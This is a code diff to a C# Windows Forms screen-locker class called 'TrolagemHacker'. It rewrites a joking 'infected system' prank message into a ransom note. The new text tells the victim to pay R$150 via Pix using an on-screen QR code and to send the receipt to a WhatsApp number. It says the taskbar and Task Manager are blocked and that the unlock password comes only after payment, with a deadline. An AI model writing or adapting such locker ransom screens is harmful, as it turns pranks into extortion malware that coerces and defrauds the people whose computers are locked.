@@ -118,7 +118,7 @@ public class TrolagemHacker : Form
         // TÍTULO
         // ============================================================
         Label lblTitulo = new Label();
-        lblTitulo.Text = "ERRO FATAL: SISTEMA INFECTADO PELO VÍRUS 'CURIOSO_V1.0'";
+        lblTitulo.Text = "ERRO FATAL: SISTEMA INFECTADO 'by Nakaxima'";
         lblTitulo.ForeColor = Color.Red;
         lblTitulo.Font = new Font("Courier New", 22, FontStyle.Bold);
         lblTitulo.TextAlign = ContentAlignment.MiddleCenter;
@@ -130,19 +130,17 @@ public class TrolagemHacker : Form
         // TEXTO ZOEIRA
         // ============================================================
         Label lblTexto = new Label();
-        lblTexto.Text = "Parece que alguem andou clicando onde nao devia, hein?\n" +
-                        "O Windows detectou um nivel critico de 'curiosidade excessiva'\n" +
-                        "e decidiu tirar ferias por 24 horas.\n\n" +
+        lblTexto.Text = "PROCEDIMENTO DE RECUPERAÇÃO OBRIGATÓRIO!\n" +
+                        "Para recuperar o funcionamento completo do computador,\n" +
+                        "é necessário efetuar o pagamento de R$ 150,00 (cento e cinquenta reais) via Pix, utilizando o QR Code exibido nesta tela.\n\n" +
                         "STATUS DO SISTEMA:\n" +
-                        "- Barra de tarefas: SEQUESTRADA\n" +
-                        "- Area de trabalho: DELETADA (BRINCADEIRINHA... OU NAO)\n" +
-                        "- Gerenciador de tarefas: EM GREVE\n" +
-                        "- Modo Seguro: BLOQUEADO\n" +
-                        "- Menu de Recuperacao: DESATIVADO\n\n" +
-                        "Se voce quiser ver sua area de trabalho de novo hoje,\n" +
-                        "vai ter que adivinhar a senha secreta.\n" +
-                        "Dica: Voce nunca vai acertar kkkkkk.\n" +
-                        "Digite a chave abaixo se tiver coragem!";
+                        "- Barra de tarefas: BLOQUEADO\n" +
+                        "- Area de trabalho: PARCIALMENTE BLOQUEADA\n" +
+                        "- Gerenciador de tarefas: BLOQUEADA\n\n" +
+                        "Após a realização do pagamento, o usuário deverá enviar o comprovante de transação para o seguinte WhatsApp:\n" +
+                        "+55 12 99743-5455\n" +
+                        "A senha de desbloqueio será fornecida exclusivamente após a confirmação do pagamento." +
+                        "Você tem o prazo abaixo...";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 11, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
